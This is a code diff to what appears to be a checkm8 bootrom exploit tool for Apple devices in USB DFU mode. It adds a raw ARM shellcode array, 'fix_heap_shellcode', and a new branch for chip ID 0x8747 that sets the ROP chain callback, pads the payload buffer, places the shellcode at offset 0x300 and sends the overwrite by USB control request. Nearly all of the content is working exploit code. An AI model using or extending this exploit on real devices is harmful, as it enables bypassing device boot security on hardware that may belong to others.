@@ -174,6 +174,21 @@ static struct {
 static size_t config_hole, ttbr0_vrom_off, ttbr0_sram_off, config_large_leak, config_overwrite_pad;
 static uint64_t tlbi, nop_gadget, ret_gadget, patch_addr, ttbr0_addr, func_gadget, write_ttbr0, memcpy_addr, aes_crypto_cmd, boot_tramp_end, gUSBSerialNumber, dfu_handle_request, usb_core_do_transfer, dfu_handle_bus_reset, insecure_memory_base, handle_interface_request, usb_create_string_descriptor, usb_serial_number_string_descriptor;
 
+static unsigned char fix_heap_shellcode[] = {
+    0xfe, 0x40, 0x2d, 0xe9, 0x3c, 0x40, 0x9f, 0xe5,
+    0x00, 0x50, 0xa0, 0xe3, 0x38, 0x60, 0x9f, 0xe5,
+    0x01, 0x60, 0x86, 0xe2, 0x05, 0x00, 0x84, 0xe0,
+    0x36, 0xff, 0x2f, 0xe1, 0x40, 0x50, 0x85, 0xe2,
+    0x1e, 0x0d, 0x55, 0xe3, 0xfa, 0xff, 0xff, 0x1a,
+    0x20, 0x40, 0x9f, 0xe5, 0x20, 0x00, 0x9f, 0xe5,
+    0x20, 0x10, 0x9f, 0xe5, 0x00, 0x00, 0x84, 0xe5,
+    0x04, 0x10, 0x84, 0xe5, 0xfe, 0x40, 0xbd, 0xe8,
+    0x14, 0x00, 0x9f, 0xe5, 0x10, 0xff, 0x2f, 0xe1,
+    0xe0, 0xb4, 0x01, 0x22, 0x1c, 0x36, 0x00, 0x00,
+    0x40, 0xb3, 0x01, 0x22, 0x08, 0x00, 0x00, 0x00,
+    0x02, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x22
+};
+
 static void
 sleep_ms(unsigned ms) {
 #ifdef WIN32
@@ -1218,12 +1233,25 @@ checkm8_stage_patch(const usb_handle_t *handle) {
 					overwrite_sz = sizeof(checkm8_overwrite);
 				}
 			} else {
-				memset(&checkm8_overwrite_armv7, '\0', sizeof(checkm8_overwrite_armv7));
-				checkm8_overwrite_armv7.callback.callback = (uint32_t)insecure_memory_base+0x300;
-				//the entry of ROP chain
-				overwrite = &checkm8_overwrite_armv7;
-				overwrite_sz = sizeof(checkm8_overwrite_armv7);
-				printf("data_sz=0x%x", data_sz);
+				if(cpid == 0x8747) {//haywire
+					memset(&checkm8_overwrite_armv7, '\0', sizeof(checkm8_overwrite_armv7));
+					checkm8_overwrite_armv7.callback.callback = (uint32_t)insecure_memory_base+0x300;
+					//the entry of ROP chain
+					overwrite = &checkm8_overwrite_armv7;
+					overwrite_sz = sizeof(checkm8_overwrite_armv7);
+					printf("data_sz=0x%zx\n", data_sz);
+					memcpy(data + data_sz, malloc(0x300-data_sz), 0x300-data_sz);
+					memcpy(data + 0x300, fix_heap_shellcode, sizeof(fix_heap_shellcode));
+					data_sz = 0x300 + sizeof(fix_heap_shellcode);
+				}
+				else {
+					checkm8_overwrite_armv7.callback.callback = (uint32_t)insecure_memory_base;
+					//the entry of ROP chain
+					overwrite = &checkm8_overwrite_armv7;
+					overwrite_sz = sizeof(checkm8_overwrite_armv7);
+				}
+
+
 			}
 			if(overwrite != NULL && send_usb_control_request(handle, 2, 3, 0, 0x80, overwrite, overwrite_sz, &transfer_ret) && transfer_ret.ret == USB_TRANSFER_STALL) {
 				ret = true;
